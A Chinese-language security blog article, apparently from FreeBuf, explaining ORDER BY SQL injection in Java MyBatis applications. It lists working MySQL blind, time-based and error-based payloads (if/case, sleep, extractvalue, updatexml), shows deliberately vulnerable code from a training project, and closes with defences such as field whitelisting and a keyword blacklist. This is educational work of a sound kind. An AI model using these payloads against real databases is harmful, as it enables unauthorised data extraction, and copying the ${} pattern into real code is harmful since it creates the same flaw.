---
title: 关于Java中order by注入详解
url: https://www.freebuf.com/articles/web/360733.html
source: FreeBuf网络安全行业门户
date: 2023-03-17
fetch_date: 2025-10-04T09:51:22.667653
---

# 关于Java中order by注入详解

[![freeBuf](/images/logoMax.png)](/)

主站

分类

云安全

AI安全

开发安全

终端安全

数据安全

Web安全

基础安全

企业安全

关基安全

移动安全

系统安全

其他安全

特色

热点

工具

漏洞

人物志

活动

安全招聘

攻防演练

政策法规

[报告](https://www.freebuf.com/report)[专辑](/column)

* ···
* [公开课](https://live.freebuf.com)
* ···
* [商城](https://shop.freebuf.com)
* ···
* 用户服务
* ···

行业服务

政 府

CNCERT
CNNVD

会员体系（甲方）
会员体系（厂商）
产品名录
企业空间

[知识大陆](https://wiki.freebuf.com/page)

搜索

![](/freebuf/img/7aa3bf7.svg) ![](/freebuf/img/181d733.svg)

创作中心

[登录](https://www.freebuf.com/oauth)[注册](https://www.freebuf.com/oauth)

官方公众号企业安全新浪微博

![](/images/gzh_code.jpg)

FreeBuf.COM网络安全行业门户，每日发布专业的安全资讯、技术剖析。

![FreeBuf+小程序](/images/xcx-code.jpg)

FreeBuf+小程序把安全装进口袋

[![](https://image.3001.net/images/20231020/1697804527_653270ef7570cc7356ba8.png)](https://wiki.freebuf.com)

关于Java中order by注入详解

* ![]()
* 关注

* [Web安全](https://www.freebuf.com/articles/web)

关于Java中order by注入详解

2023-03-16 23:33:46

所属地 重庆

![](https://image.3001.net/images/20240308/1709876354_65eaa4828e91d155430d9.png)
本文由
创作，已纳入「FreeBuf原创奖励计划」，未授权禁止转载

## 起因

因为最近在准备面试的东西，在一天下午面试成都某家公司的时候被问到java的order by注入，当时因为懵了并没有做很好的回答...其实还是因为太过急躁在之前学习SQL注入时并没有深入到代码层面理解各个类型漏洞，造成根基并没有打牢。实际上针对不同类型的漏洞在源码层面有很大的不同，例如php中联合查询一定是存在回显位，即将数据库中查询结果展示；盲注大概率是进行了if判断；报错注入一般存在这类函数`print_r(mysql_error())`(java中catch (Exception e) { return e.toString(); })等。

## order by 注入方式

直接从mybatis框架的注入说起吧

在mybatis中的，使用`#`包裹的字段在内部进行了预编译处理，而`$`并没有使用预编译，也就是原生jdbc中
prepareStatement和Statement的区别。
关于order by，当注入点在后面时，是不能连接union的，例如：

```
select * from users order by user;
```

![image.png](https://image.3001.net/images/20230315/1678886239_6411c55fa9954ecd67531.png!small)

![image.png](https://image.3001.net/images/20230315/1678886732_6411c74c1d6c7208e2224.png!small)

在SQL中是不允许union直接跟在order by后面的，所以我们可以考虑使用盲注或报错注入。

### 利用盲注，也就是看返回值

#### 已知字段

使用if条件句，`if(1=1,id,user)`,if函数三个占位，1=1为表达式，也是后续注入主要利用的地方，表达式为真返回以id排序，为假返回user排序，而真假返回的查询结果是不一样的，所以可以通过这种方式注入。

![image.png](https://image.3001.net/images/20230315/1678887657_6411cae961cb367911173.png!small)

其他的利用方式还有：

```
select * from users order by (case when (1=1) then user else id end ); //根据user排序
select * from users order by (case when (1=2) then user else id end ); //根据id排序
select * from users order by ifnull(null,user);
select * from users order by ifnull(null,id);
select * from users order by rand(1=1);
select * from users order by rand(1=2);
```

#### 未知字段

在实际注入时，可能字段并不是我们提前知道的，那么可能就需要用另外的方式了。

同样以if()为例，只需要改下第三个参数使其查询报错`select 1 union select 2`，第二个参数也需要改为1(true)，之前因为没改导致运行时mysql崩了，甚至连mysql服务都给我干关闭了。。。

![image.png](https://image.3001.net/images/20230315/1678889012_6411d034d16694bb9f6ee.png!small)

同样的方式还有：

```
select * from users order by if(1=1,1,(select 1 from information_schema.tables));
select * from users order by if(1=2,1,(select 1 from information_schema.tables));
select * from users order by (select 1 regexp if(1=1,1,0x00)); //正则表达式
select * from users order by (select 1 regexp if(1=2,1,0x00));  //0x00为空导致报错
select * from users order by (select if((ascii(substr(current,1,1))<0),1,sleep(2)) from (select user() as current) as tb1);  //利用sleep延时注入
```

在使用sleep延时注入需要注意不能直接简单sleep(x)，这样实际延时的时间将会是x乘以表内列的字段数量，例如我这里延时2\*3秒。
![image.png](https://image.3001.net/images/20230316/1678970055_64130cc70d71943401551.png!small)

### 利用报错函数

报错注入的条件是需要服务端代码中将SQL报错语句输出。
主要是利用extractvalue和updatexml
![image.png](https://image.3001.net/images/20230316/1678970719_64130f5f1f8e3eb5a20f8.png!small)

```
select * from users order by extractvalue(1,(select concat(0x7e,user())));
select * from users order by updatexml(1,(select concat(0x7e,user())),1);
select * from users order by (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a); //floor报错注入，Duplicate key
```

## 安全问题

在mybatis中无论是使用xml或者注解编写SQL语句时，都是推荐结合`#`使用，因为内部使用了预编译，然而在一些特殊场景我们并不能这般，如在`like`后直接使用`#`包裹变量在运行时是会报错的，推荐的写法是`concat('%',#{q},'%')`。
这里推荐一个安全检测插件：MomoSec 可以初步检测一些安全问题
![image.png](https://image.3001.net/images/20230316/1678972035_64131483e560c3250c0aa.png!small)
order by 在mybatis中同样不能直接使用`#`包裹，因为order by后跟的往往是字段名，而预编译在对一个参数使用时会加上引号,字段名是不能加引号的,否则会失去本来的意思；如 order by id ==> order by 'id' ，这也是为什么在排序的位置通常会存在sql注入。
关于order by 并没有很好的解决方案，所以预编译也不是完全安全的，在防御时还应使用其他方法做好防御，如waf和filter。

### 案例

代码直接使用的这个项目：[Hello-Java-Sec](https://github.com/j3ers3/Hello-Java-Sec)

```
@GetMapping("/vul/order")
    public List<User> orderBy(String field, String sort) {
        log.info("[vul] mybaits: order by " + field + " " + sort);
        return userMapper.orderBy(field, sort);
```

UserMapper.xml

```
<select id="orderBy" resultType="com.best.hello.entity.User">
        select *
        from users
        order by ${field} ${sort}
    </select>
```

因为未知列名，使用盲注：结果输出不同
![image.png](https://image.3001.net/images/20230316/1678973928_64131be89e8d1b32eae26.png!small)
![image.png](https://image.3001.net/images/20230316/1678973958_64131c06044420cb43d74.png!small)
常规的盲注了，python写个脚本即可
![image.png](https://image.3001.net/images/20230316/1678974294_64131d56d40dbc9111664.png!small)
上面使用的盲注，springboot项目是默认有报错页面的，所以报错注入也可以
![image.png](https://image.3001.net/images/20230316/1678974625_64131ea19b9de93551db6.png!small)
那么代码中是如何防御的呢？
实际上他是在xml中固定化了传入参数，id或user，也就没办法注入了。
![image.png](https://image.3001.net/images/20230316/1678978734_64132eae3ce0ea7e57466.png!small)
但是有个问题，当表内字段很大时我们不可能写很多复杂的匹配判断，所以可以写个filter或waf函数,过滤掉危险字符，所有的用户输入都经过函数过滤也是一种不错的方式。

```
/**
     * SQL注入检测
     */
    public static boolean checkSql(String content) {
        String[] black_list = {"'", ";", "--", "+", ",", "%", "=", ">", "<", "*", "(", ")", "and", "or", "exec", "insert", "select", "delete", "update", "count", "drop", "chr", "mid", "master", "truncate", "char", "declare"};
        for (String s : black_list) {
            if (content.toLowerCase().contains(s)) {
                return true;
            }
        }
        return false;
    }
```

## 小结

order by注入一直是容易被面试官问到的点，我也是简单做了总结。
在后期的学习中还是需要多跟着代码走，一味的复现靶场环境好像学到的东西真的挺少的。

# SQL注入 # Java代码审计

免责声明

1.一般免责声明：本文所提供的技术信息仅供参考，不构成任何专业建议。读者应根据自身情况谨慎使用且应遵守《中华人民共和国网络安全法》，作者及发布平台不对因使用本文信息而导致的任何直接或间接责任或损失负责。

2. 适用性声明：文中技术内容可能不适用于所有情况或系统，在实际应用前请充分测试和评估。若因使用不当造成的任何问题，相关方不承担责任。

3. 更新声明：技术发展迅速，文章内容可能存在滞后性。读者需自行判断信息的时效性，因依据过时内容产生的后果，作者及发布平台不承担责任。

![]()

![](https://image.3001.net/images/20240308/1709876354_65eaa4828e91d155430d9.png)
已在FreeBuf发表 0 篇文章

本文为 独立观点，未经授权禁止转载。
如需授权、对文章有疑问或需删除稿件，请联系 FreeBuf
客服小蜜蜂（微信：freebee1024）

被以下专辑收录，发现更多精彩内容

+ 收入我的专辑

+ 加入我的收藏

展开更多

相关推荐

![]()

关 注

* 0 文章数
* 0 关注者

文章目录

起因

order by 注入方式

* 利用盲注，也就是看返回值
* 利用报错函数

安全问题

* 案例

小结

![](/images/logo_b.png)

本站由阿里云 提供计算与安全服务

### 用户服务

* [有奖投稿](https://www.freebuf.com/write)
* [提交漏洞](https://www.vulbox.com/bounties/detail-72)
* [参与众测](https://www.vulbox.com/projects/list)
* [商城](https://shop.freebuf.com)

### 企业服务

* [安全咨询](https://company.freebuf.com)
* [产业全景图](https://www.freebuf.com/news/307349.html)
* [企业SRC](https://www.vulbox.com/service/src)
* [安全众测](https://www.vulbox.com/)

### 合作信息

* [斗象官网](https://www.tophant.com/)
* [广告投放](https://www.freebuf.com/articles/444331.html)
* [联系我们](https://www.freebuf.com/articles/444332.html)

### 关于我们

* [关于我们](https://www.freebuf.com/news/others/864.html)
* 微信公众号
* [新浪微博](http://weibo.com/freebuf)

### 战略伙伴

* [![](https://image.3001.net/images/20191017/1571306518_5da83c1686dd9.png)](http://www.aliyun.com/?freebuf)

### FreeBuf知识大陆

![](https://image.3001.net/images/20250703/1751535036_68664dbcae34ac40bb9e7.png)

扫码把安全装进口袋

* [斗象科技](https://www.tophant.com/)
* [FreeBuf](https://www.freebuf.com)
* [漏洞盒子](https://www.vulbox.com/)
* [斗象智能安全](https://ai.tophant.com/)
* [免责条款](https://www.freebuf.com/dis)
* [协议条款](https://my.freebuf.com/AgreeProtocol/duty)

Copyright © 2025 WWW.FREEBUF.COM All Rights Reserved
[沪ICP备2024099014号](https://beian.miit.gov.cn/#/Integrated/index) | [沪公安网备
![](https://image.3001.net/images/20200106/1578291342_5e12d08ec2379.png)](http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=31011502009321)